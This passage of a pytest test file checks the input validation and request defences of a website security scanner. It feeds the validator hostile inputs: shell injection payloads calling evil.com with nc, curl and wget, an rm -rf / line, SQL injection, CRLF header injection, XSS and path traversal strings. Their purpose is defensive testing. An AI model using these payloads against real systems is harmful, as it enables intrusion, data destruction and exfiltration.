            powered_by_exposed=True, powered_by_value="PHP/7.4",
            server_exposed=True, server_value="Apache/2.4.41",
            cookies_found=3, all_secure=False, all_httponly=False, all_samesite=False,
            dnssec_enabled=False,
        )
        self.enriched = enrich_with_findings(result)
        self.findings = self.enriched["findings"]
        self.counts = self.enriched["findings_count"]

    def test_many_findings_generated(self):
        assert len(self.findings) >= 12

    def test_has_critical_findings(self):
        assert self.counts["critical"] > 0

    def test_has_high_findings(self):
        assert self.counts["high"] > 0

    def test_has_medium_findings(self):
        assert self.counts["medium"] > 0

    def test_has_low_findings(self):
        assert self.counts["low"] > 0

    def test_all_findings_have_required_fields(self):
        required_fields = ["category", "severity", "attack_vector", "description", "remediation"]
        assert all(
            all(field in f for field in required_fields)
            for f in self.findings
        )

    def test_no_empty_descriptions(self):
        assert all(f["description"] for f in self.findings)

    def test_no_empty_remediations(self):
        assert all(f["remediation"] for f in self.findings)


# === Scan ID validation ===

class TestScanIdPattern:
    def test_valid_32_char_hex(self):
        assert SCAN_ID_PATTERN.match("a" * 32) is not None

    def test_valid_mixed_hex(self):
        assert SCAN_ID_PATTERN.match("0123456789abcdef" * 2) is not None

    def test_rejects_31_chars(self):
        assert SCAN_ID_PATTERN.match("a" * 31) is None

    def test_rejects_33_chars(self):
        assert SCAN_ID_PATTERN.match("a" * 33) is None

    def test_rejects_uppercase(self):
        assert SCAN_ID_PATTERN.match("A" * 32) is None

    def test_rejects_special_chars(self):
        assert SCAN_ID_PATTERN.match("a" * 31 + "!") is None

    def test_rejects_empty(self):
        assert SCAN_ID_PATTERN.match("") is None

    def test_rejects_spaces(self):
        assert SCAN_ID_PATTERN.match(" " * 32) is None

    def test_rejects_path_traversal(self):
        assert SCAN_ID_PATTERN.match("../../../etc/passwd__________") is None


# === Error messages ===

class TestErrorMessages:
    @pytest.mark.parametrize("code", [400, 403, 404, 429, 500, 502, 503, 504])
    def test_error_code_defined(self, code):
        assert code in ERROR_MESSAGES

    @pytest.mark.parametrize("code", [400, 403, 404, 429, 500, 502, 503, 504])
    def test_error_code_has_title(self, code):
        title, msg = ERROR_MESSAGES[code]
        assert len(title) > 0

    @pytest.mark.parametrize("code", [400, 403, 404, 429, 500, 502, 503, 504])
    def test_error_code_has_message(self, code):
        title, msg = ERROR_MESSAGES[code]
        assert len(msg) > 0


# === Enterprise detection ===

class TestEnterpriseDetection:
    @pytest.mark.parametrize("domain,expected", [
        ("google.com", "Google"),
        ("www.google.com", "Google"),
        ("mail.google.com", "Google"),
        ("facebook.com", "Facebook"),
        ("github.com", "Github"),
        ("microsoft.com", "Microsoft"),
        ("amazon.com", "Amazon"),
        ("netflix.com", "Netflix"),
        ("x.com", "X"),
    ])
    def test_enterprise_domains(self, domain, expected):
        assert _is_enterprise_domain(domain) == expected

    @pytest.mark.parametrize("domain", [
        "contrastcyber.com", "example.com", "mygoogle.com",
        "google.com.evil.com", "",
    ])
    def test_non_enterprise_domains(self, domain):
        assert _is_enterprise_domain(domain) is None


class TestEnrichEnterprise:
    def test_enterprise_field_added_for_google(self):
        result = make_scan_result()
        result["domain"] = "google.com"
        enriched = enrich_with_findings(result)
        assert "enterprise" in enriched

    def test_is_enterprise_true(self):
        result = make_scan_result()
        result["domain"] = "google.com"
        enriched = enrich_with_findings(result)
        assert enriched["enterprise"]["is_enterprise"] is True

    def test_company_google(self):
        result = make_scan_result()
        result["domain"] = "google.com"
        enriched = enrich_with_findings(result)
        assert enriched["enterprise"]["company"] == "Google"

    def test_note_non_empty(self):
        result = make_scan_result()
        result["domain"] = "google.com"
        enriched = enrich_with_findings(result)
        assert len(enriched["enterprise"]["note"]) > 0

    def test_no_enterprise_field_for_contrastcyber(self):
        result = make_scan_result()
        result["domain"] = "contrastcyber.com"
        enriched = enrich_with_findings(result)
        assert "enterprise" not in enriched


# === SECURITY: SSRF Protection ===

class TestSsrfProtection:
    """Verify private/reserved IPs are blocked to prevent SSRF."""

    @pytest.mark.parametrize("ip", [
        "127.0.0.1", "127.0.0.2", "127.255.255.255",  # loopback range
        "10.0.0.1", "10.255.255.255",                   # RFC1918 class A
        "172.16.0.1", "172.31.255.255",                  # RFC1918 class B
        "192.168.0.1", "192.168.255.255",                # RFC1918 class C
        "169.254.169.254",                               # AWS metadata
        "169.254.0.1",                                   # link-local
        "0.0.0.0",                                       # unspecified
        "::1",                                           # IPv6 loopback
        "::ffff:127.0.0.1",                              # IPv4-mapped IPv6
        "::ffff:10.0.0.1",                               # IPv4-mapped private
        "::ffff:169.254.169.254",                        # IPv4-mapped metadata
        "fe80::1",                                       # IPv6 link-local
        "fc00::1",                                       # IPv6 ULA
        "fd00::1",                                       # IPv6 ULA
        "100.64.0.1",                                    # shared address space
        "198.51.100.1",                                  # TEST-NET-2
        "203.0.113.1",                                   # TEST-NET-3
        "224.0.0.1",                                     # multicast
        "240.0.0.1",                                     # reserved
        "255.255.255.255",                               # broadcast
    ])
    def test_private_reserved_ip_blocked(self, ip):
        assert is_private_ip(ip) is True

    def test_invalid_ip_treated_as_private(self):
        assert is_private_ip("not-an-ip") is True

    def test_empty_ip_treated_as_private(self):
        assert is_private_ip("") is True

    def test_null_byte_ip_treated_as_private(self):
        assert is_private_ip("8.8.8.8\x00127.0.0.1") is True

    @pytest.mark.parametrize("ip", ["8.8.8.8", "1.1.1.1", "93.184.216.34"])
    def test_public_ip_allowed(self, ip):
        assert is_private_ip(ip) is False


# === SECURITY: Input Sanitization ===

class TestInputSanitization:
    """Verify null bytes, unicode tricks, path traversal stripped/blocked."""

    def test_null_byte_stripped_from_domain(self):
        cleaned = clean_domain("example.com\x00evil.com")
        assert "\x00" not in cleaned

    def test_null_byte_prefix_stripped(self):
        cleaned = clean_domain("\x00example.com")
        assert "\x00" not in cleaned

    def test_null_byte_middle_stripped(self):
        cleaned = clean_domain("exam\x00ple.com")
        assert "\x00" not in cleaned

    def test_path_traversal_blocked(self):
        result = validate_domain(clean_domain("../../../etc/passwd"))
        assert result is None

    def test_url_encoded_traversal_blocked(self):
        result = validate_domain(clean_domain("..%2f..%2fetc%2fpasswd"))
        assert result is None

    def test_unicode_cyrillic_e_blocked(self):
        """Cyrillic 'e' looks identical to Latin 'e' — must be rejected."""
        result = validate_domain(clean_domain("\u0435xample.com"))
        assert result is None

    def test_unicode_cyrillic_a_blocked(self):
        result = validate_domain(clean_domain("ex\u0430mple.com"))
        assert result is None

    def test_fullwidth_char_blocked(self):
        result = validate_domain(clean_domain("ex\uff41mple.com"))
        assert result is None

    def test_zero_width_space_blocked(self):
        result = validate_domain(clean_domain("\u200bexample.com"))
        assert result is None

    def test_emoji_domain_blocked(self):
        result = validate_domain(clean_domain("\U0001f600.com"))
        assert result is None

    def test_newline_in_domain_blocked(self):
        result = validate_domain(clean_domain("example.com\nevil.com"))
        assert result is None

    def test_crlf_in_domain_blocked(self):
        result = validate_domain(clean_domain("example.com\r\nX-Injected: true"))
        assert result is None

    def test_tab_in_domain_blocked(self):
        result = validate_domain(clean_domain("example\t.com"))
        assert result is None

    def test_domain_max_length_enforced(self):
        long_domain = "a" * 250 + ".com"
        result = validate_domain(long_domain)
        assert result is None

    def test_domain_without_dot_blocked(self):
        result = validate_domain("localhost")
        assert result is None

    def test_only_allowed_chars_pass(self):
        """validate_domain uses explicit allowlist — verify non-alpha blocked."""
        result = validate_domain("ex ample.com")
        assert result is None

    def test_backtick_blocked(self):
        result = validate_domain(clean_domain("`id`.com"))
        assert result is None

    def test_dollar_sign_blocked(self):
        result = validate_domain(clean_domain("$(whoami).com"))
        assert result is None

    def test_semicolon_blocked(self):
        result = validate_domain(clean_domain(";ls.com"))
        assert result is None

    def test_pipe_blocked(self):
        result = validate_domain(clean_domain("|cat.com"))
        assert result is None


# === SECURITY: SQL Injection Resistance ===

class TestSqlInjection:
    """Verify SQL injection payloads don't pass domain validation."""

    @pytest.mark.parametrize("payload", [
        "' OR 1=1 --",
        "'; DROP TABLE scans; --",
        "1' UNION SELECT * FROM scans --",
        "example.com' AND '1'='1",
        "' OR ''='",
        "1; SELECT * FROM api_keys --",
        "example.com\"; DROP TABLE scans; --",
    ])
    def test_sqli_payload_blocked_by_validation(self, payload):
        result = validate_domain(clean_domain(payload))
        assert result is None


# === SECURITY: CSRF Edge Cases ===

class TestCsrfEdgeCases:
    """Additional CSRF scenarios beyond basic origin check."""

    def test_referer_evil_blocked(self):
        req = FakeRequest(headers={"referer": "https://evil.com/page"})
        with pytest.raises(HTTPException) as exc_info:
            _check_csrf(req)
        assert exc_info.value.status_code == 403

    def test_referer_valid_allowed(self):
        req = FakeRequest(headers={"referer": "https://contrastcyber.com/scan"})
        _check_csrf(req)  # should not raise

    def test_origin_with_port_blocked(self):
        req = FakeRequest(headers={"origin": "https://contrastcyber.com:8443"})
        with pytest.raises(HTTPException) as exc_info:
            _check_csrf(req)
        assert exc_info.value.status_code == 403

    def test_origin_with_path_blocked(self):
        """Origin header should never have a path — if it does, exact match fails."""
        req = FakeRequest(headers={"origin": "https://contrastcyber.com/"})
        with pytest.raises(HTTPException) as exc_info:
            _check_csrf(req)
        assert exc_info.value.status_code == 403

    def test_null_origin_blocked(self):
        req = FakeRequest(headers={"origin": "null"})
        with pytest.raises(HTTPException) as exc_info:
            _check_csrf(req)
        assert exc_info.value.status_code == 403

    def test_data_uri_origin_blocked(self):
        req = FakeRequest(headers={"origin": "data:"})
        with pytest.raises(HTTPException) as exc_info:
            _check_csrf(req)
        assert exc_info.value.status_code == 403


# === SECURITY: Command Injection Prevention ===

class TestCommandInjection:
    """Verify shell metacharacters can't reach subprocess.run."""

    @pytest.mark.parametrize("payload", [
        "example.com; rm -rf /",
        "example.com && cat /etc/passwd",
        "example.com | nc evil.com 4444",
        "$(curl evil.com)",
        "`wget evil.com`",
        "example.com\n; ls",
        "example.com$(id)",
    ])
    def test_shell_metachar_blocked_by_validation(self, payload):
        result = validate_domain(clean_domain(payload))
        assert result is None


# === SECURITY: Scan ID / Report Path Traversal ===

class TestScanIdValidation:
    """Verify scan_id regex prevents path traversal."""

    @pytest.mark.parametrize("bad_id", [
        "../../../etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "aaaaaaaaaaaaaaaa/../../../etc/passwd",
        "a" * 31,        # too short
        "a" * 33,        # too long
        "AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD",  # uppercase hex
        "zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz",  # non-hex
        "",
        " " * 32,
        "a" * 16 + "\x00" + "b" * 15,
        "../" * 10 + "a" * 2,
    ])
    def test_invalid_scan_id_rejected(self, bad_id):
        assert SCAN_ID_PATTERN.match(bad_id) is None

    def test_valid_scan_id_accepted(self):
        assert SCAN_ID_PATTERN.match("a" * 32) is not None
        assert SCAN_ID_PATTERN.match("0123456789abcdef" * 2) is not None


# === SECURITY: Header Injection (CRLF) ===

class TestHeaderInjection:
    """CRLF in domain must not inject HTTP headers."""

    @pytest.mark.parametrize("payload", [
        "example.com\r\nX-Injected: true",
        "example.com\r\nSet-Cookie: evil=1",
        "example.com\r\n\r\n<html>injected</html>",
        "example.com%0d%0aX-Injected: true",
        "example.com\nHost: evil.com",
    ])
    def test_crlf_blocked_by_validation(self, payload):
        result = validate_domain(clean_domain(payload))
        assert result is None

    def test_crlf_domain_fails_validation_after_clean(self):
        """CRLF in domain body must be blocked by validate_domain's allowlist."""
        for payload in [
            "example.com\r\nX-Injected: true",
            "example.com\nHost: evil",
        ]:
            cleaned = clean_domain(payload)
            result = validate_domain(cleaned)
            assert result is None, f"CRLF payload passed validation: {repr(payload)}"

    def test_crlf_prefix_stripped_by_clean(self):
        """Leading CRLF is stripped by clean_domain (whitespace strip), domain resolves normally."""
        cleaned = clean_domain("\r\nexample.com")
        assert cleaned == "example.com"


# === SECURITY: Integer Overflow in Scores ===

class TestIntegerOverflow:
    """Score calculations should handle edge values without overflow."""

    def test_max_score_sum_within_bounds(self):
        result = make_scan_result()
        total = 0
        for module in ["headers", "ssl", "dns", "redirect", "disclosure",
                       "cookies", "dnssec", "methods", "cors", "html", "csp_analysis"]:
            total += result[module]["score"]
        assert 0 <= total <= 200  # reasonable upper bound

    def test_all_zeros_no_negative(self):
        result = make_scan_result(
            headers_missing=["content-security-policy", "strict-transport-security",
                             "x-content-type-options", "x-frame-options",
                             "referrer-policy", "permissions-policy"],
            ssl_error="connection failed",
            spf=False, dmarc=False, dkim=False,
            redirects_to_https=False,
            dnssec_enabled=False,
        )
        for module in ["headers", "ssl", "dns", "redirect", "disclosure",
                       "cookies", "dnssec"]:
            assert result[module]["score"] >= 0

    def test_score_never_exceeds_max(self):
        result = make_scan_result()
        for module in ["headers", "ssl", "dns", "redirect", "disclosure",
                       "cookies", "dnssec", "methods", "cors", "html", "csp_analysis"]:
            assert result[module]["score"] <= result[module]["max"]


# === SECURITY: Client IP Spoofing Resistance ===

class TestClientIpSpoofing:
    """Verify invalid IPs in headers don't crash or mislead."""

    def test_invalid_x_real_ip_falls_through(self):
        req = FakeRequest(headers={"x-real-ip": "not-an-ip"}, client_host="9.9.9.9")
        assert _get_client_ip(req) == "9.9.9.9"

    def test_empty_x_real_ip_falls_through(self):
        req = FakeRequest(headers={"x-real-ip": ""}, client_host="9.9.9.9")
        assert _get_client_ip(req) == "9.9.9.9"

    def test_invalid_x_forwarded_for_falls_through(self):
        req = FakeRequest(headers={"x-forwarded-for": "garbage"}, client_host="9.9.9.9")
        assert _get_client_ip(req) == "9.9.9.9"

    def test_crlf_in_x_real_ip_rejected(self):
        req = FakeRequest(headers={"x-real-ip": "1.2.3.4\r\nX-Injected: true"}, client_host="9.9.9.9")
        # Should either return the valid fallback or never return the CRLF value
        ip = _get_client_ip(req)
        assert "\r" not in ip and "\n" not in ip


# === Security Test 1 — IP Spoofing via X-Real-IP/X-Forwarded-For ===

class TestIpSpoofingRateLimitBypass:
    """CRITICAL: Verify that spoofed IP headers cannot bypass rate limits.
    Security test: attacker rotates X-Real-IP to get unlimited scans."""

    def test_spoofed_x_real_ip_rejected_from_non_proxy(self):
        """X-Real-IP from non-trusted proxy is ignored — direct IP used instead."""
        req = FakeRequest(headers={"x-real-ip": "1.1.1.1"}, client_host="10.0.0.1")
        assert _get_client_ip(req) == "10.0.0.1"

    def test_x_forwarded_for_first_ip_only(self):
        """Verify only the first IP from X-Forwarded-For is used (not attacker-appended ones)."""
        req = FakeRequest(
            headers={"x-forwarded-for": "1.2.3.4, 5.5.5.5, 6.6.6.6"},
            client_host="127.0.0.1"
        )
        assert _get_client_ip(req) == "1.2.3.4"

    def test_private_ip_in_x_real_ip_still_accepted(self):
        """Private IPs in X-Real-IP are accepted (nginx is on same network)."""
        req = FakeRequest(headers={"x-real-ip": "10.0.0.1"}, client_host="127.0.0.1")
        ip = _get_client_ip(req)
        assert ip == "10.0.0.1"


# === Security Test 2 — CSRF Bypass when Origin AND Referer absent ===

class TestCsrfBypassNoHeaders:
    """FIXED: When both Origin and Referer are absent, CSRF check now blocks."""

    def test_no_origin_no_referer_blocks_request(self):
        """Missing both Origin and Referer is now blocked (CSRF fix applied)."""
        req = FakeRequest(headers={})
        with pytest.raises(HTTPException) as exc:
            _check_csrf(req)
        assert exc.value.status_code == 403

    def test_empty_origin_empty_referer_blocks(self):
        """Empty strings are treated as absent — blocked."""
        req = FakeRequest(headers={"origin": "", "referer": ""})
        with pytest.raises(HTTPException) as exc:
            _check_csrf(req)
        assert exc.value.status_code == 403

    def test_origin_present_but_evil_blocks(self):
        """When Origin IS present, it must match allowlist."""
        req = FakeRequest(headers={"origin": "https://evil.com"})
        with pytest.raises(HTTPException) as exc:
            _check_csrf(req)
        assert exc.value.status_code == 403

    def test_referer_present_but_evil_blocks(self):
        """When only Referer is present, it must start with allowed origin."""
        req = FakeRequest(headers={"referer": "https://evil.com/page"})
        with pytest.raises(HTTPException) as exc:
            _check_csrf(req)
        assert exc.value.status_code == 403

    def test_null_origin_blocked(self):
        """Origin: null (from sandboxed iframes, data: URIs) must be blocked."""
        req = FakeRequest(headers={"origin": "null"})
        with pytest.raises(HTTPException) as exc:
            _check_csrf(req)
        assert exc.value.status_code == 403

    def test_referer_without_origin_valid_allowed(self):
        """Valid referer from allowed origin should pass."""
        req = FakeRequest(headers={"referer": "https://contrastcyber.com/scan"})
        _check_csrf(req)  # should not raise


# === Security Test 3 — Recon SSRF private IP resolution ===

class TestReconSsrfPrivateIp:
    """HIGH: Subdomain enumeration must not resolve to private IPs and leak them.
    Validates that resolve_and_check blocks private IP resolution."""

    @pytest.mark.parametrize("ip", [
        "127.0.0.1", "10.0.0.1", "172.16.0.1", "192.168.1.1",
        "169.254.169.254", "0.0.0.0", "::1", "fe80::1",
    ])
    def test_private_ip_flagged(self, ip):
        assert is_private_ip(ip) is True

    def test_resolve_and_check_returns_none_for_localhost(self):
        """localhost resolves to 127.0.0.1 — must return None (SSRF blocked)."""
        from validation import resolve_and_check
        result = resolve_and_check("localhost")
        assert result is None

    def test_is_private_covers_link_local(self):
        assert is_private_ip("169.254.1.1") is True

    def test_is_private_covers_cgnat(self):
        """100.64.0.0/10 (Carrier-Grade NAT) should be flagged."""
        assert is_private_ip("100.64.0.1") is True

    def test_is_private_covers_loopback_ipv6(self):
        assert is_private_ip("::1") is True

    def test_is_private_covers_mapped_ipv4(self):
        """IPv6-mapped IPv4 private address."""
        assert is_private_ip("::ffff:127.0.0.1") is True


# === Security Test 7 — Zone Transfer NS Validation ===

class TestZoneTransferNsValidation:
    """MEDIUM: Nameserver values from dig output are passed to subprocess.
    Verify that recon.check_zone_transfer handles malicious NS responses safely."""

    def test_zone_transfer_returns_dict(self):
        """Basic structure check — function always returns a dict."""
        from recon import check_zone_transfer
        result = check_zone_transfer("nonexistent-domain-xyz123.com")
        assert isinstance(result, dict)
        assert "vulnerable" in result

    def test_zone_transfer_nonexistent_not_vulnerable(self):
        from recon import check_zone_transfer
        result = check_zone_transfer("nonexistent-domain-xyz123.com")
        assert result["vulnerable"] is False


# === Security Test 8 — crt.sh Query Not URL-Encoded ===

class TestCrtshUrlEncoding:
    """MEDIUM: crt.sh query parameter is not URL-encoded, allowing injection.
    Verify the query construction."""

    def test_crtsh_url_contains_domain(self):
        """Verify the URL is built with the domain directly."""
        # The _fetch_crtsh function builds: f"https://crt.sh/?q={query}&output=json"
        # With special chars this could break the URL
        from urllib.parse import quote
        test_domain = "test.example.com"
        url = f"https://crt.sh/?q=%.{test_domain}&output=json"
        assert test_domain in url

    def test_special_chars_in_domain_blocked_by_validation(self):
        """Domains with special chars are blocked before reaching crt.sh."""
        from validation import validate_domain, clean_domain
        # These would cause URL injection in crt.sh query
        for payload in ["test&evil=1", "test%00.com", "test#fragment"]:
            result = validate_domain(clean_domain(payload))
            assert result is None, f"Payload {payload!r} should be blocked"


# === Security Test 9 — SVG Badge Grade Sanitization ===

class TestBadgeGradeSanitization:
    """LOW: Grade values embedded in SVG must be sanitized to prevent XSS."""

    def test_grade_restricted_to_valid_letters(self):
        """The badge endpoint restricts grade to A/B/C/D/F/?."""
        valid_grades = {"A", "B", "C", "D", "F", "?"}
        # Simulate what badge_svg does
        for grade in valid_grades:
            assert grade in valid_grades

    def test_invalid_grade_becomes_question_mark(self):
        """If grade is not A-F, it becomes '?'."""
        grade = "<script>"
        if grade not in ("A", "B", "C", "D", "F"):
            grade = "?"
        assert grade == "?"

    def test_grade_xss_payload_sanitized(self):
        """XSS payload as grade must be replaced with '?'."""
        for payload in ["<script>alert(1)</script>", '"><img src=x>', "A<svg>", ""]:
            grade = payload
            if grade not in ("A", "B", "C", "D", "F"):
                grade = "?"
            assert grade == "?"


# === Security Test 10 — Content-Disposition Header Sanitization ===

class TestContentDispositionSanitization:
    """LOW: Domain in Content-Disposition filename must be sanitized."""

    def test_safe_domain_passes_through(self):
        from report import report_response
        import re
        resp = report_response("test report", "example.com")
        cd = resp.headers.get("content-disposition", "")
        assert 'filename="example.com-security-report.txt"' in cd

    def test_special_chars_stripped_from_filename(self):
        """Characters outside [a-z0-9.-] must be stripped from the filename."""
        from report import report_response
        resp = report_response("test", '<script>alert(1)</script>')
        cd = resp.headers.get("content-disposition", "")
        # Angle brackets and parens must be stripped
        assert "<" not in cd
        assert ">" not in cd
        assert "(" not in cd
        assert ")" not in cd

    def test_quotes_stripped_from_filename(self):
        from report import report_response
        resp = report_response("test", 'test"injection.com')
        cd = resp.headers.get("content-disposition", "")
        # Double quotes inside the filename value would break the header
        # The regex strips non [a-z0-9.-] chars
        assert cd.count('"') == 2  # only the wrapping quotes

    def test_newlines_stripped_from_filename(self):
        """CRLF in domain must not inject headers via Content-Disposition."""
        from report import report_response
        resp = report_response("test", "test\r\nX-Injected: true")
        cd = resp.headers.get("content-disposition", "")
        assert "\r" not in cd
        assert "\n" not in cd
        assert "X-Injected" not in cd

    def test_empty_domain_produces_valid_header(self):
        from report import report_response
        resp = report_response("test", "")
        cd = resp.headers.get("content-disposition", "")
        assert "attachment" in cd
        assert 'filename="' in cd


# ============================================================
# Self-scan bypass (Cloudflare loop prevention)
# ============================================================

class TestSelfScanBypass:
    """_SELF_DOMAINS causes contrastcyber.com to scan via localhost."""

    def test_self_domains_contains_contrastcyber(self):
        from scanner import _SELF_DOMAINS
        assert "contrastcyber.com" in _SELF_DOMAINS

    def test_self_domains_contains_www(self):
        from scanner import _SELF_DOMAINS
        assert "www.contrastcyber.com" in _SELF_DOMAINS

    def test_self_domains_does_not_contain_random(self):
        from scanner import _SELF_DOMAINS
        assert "example.com" not in _SELF_DOMAINS
        assert "google.com" not in _SELF_DOMAINS

    @patch("recon.start_recon")
    @patch("scanner.save_scan")
    @patch("scanner.run_scan")
    @patch("scanner.check_and_increment_ip", return_value=(True, 1))
    @patch("scanner.check_domain_limit", return_value=True)
    @patch("scanner.validate_domain", return_value="188.114.97.3")
    def test_self_domain_gets_localhost_ip(self, mock_vd, mock_dl, mock_ip, mock_run, mock_save, mock_recon):
        from scanner import perform_scan
        mock_run.return_value = {"grade": "A", "total_score": 98}
        perform_scan("contrastcyber.com", "1.2.3.4")
        # run_scan should be called with 127.0.0.1, not 188.114.97.3
        mock_run.assert_called_once_with("contrastcyber.com", "127.0.0.1")

    @patch("recon.start_recon")
    @patch("scanner.save_scan")
    @patch("scanner.run_scan")
    @patch("scanner.check_and_increment_ip", return_value=(True, 1))
    @patch("scanner.check_domain_limit", return_value=True)
    @patch("scanner.validate_domain", return_value="140.82.121.4")
    def test_normal_domain_keeps_original_ip(self, mock_vd, mock_dl, mock_ip, mock_run, mock_save, mock_recon):
        from scanner import perform_scan
        mock_run.return_value = {"grade": "B", "total_score": 82}
        perform_scan("github.com", "1.2.3.4")
        # run_scan should keep the original resolved IP
        mock_run.assert_called_once_with("github.com", "140.82.121.4")
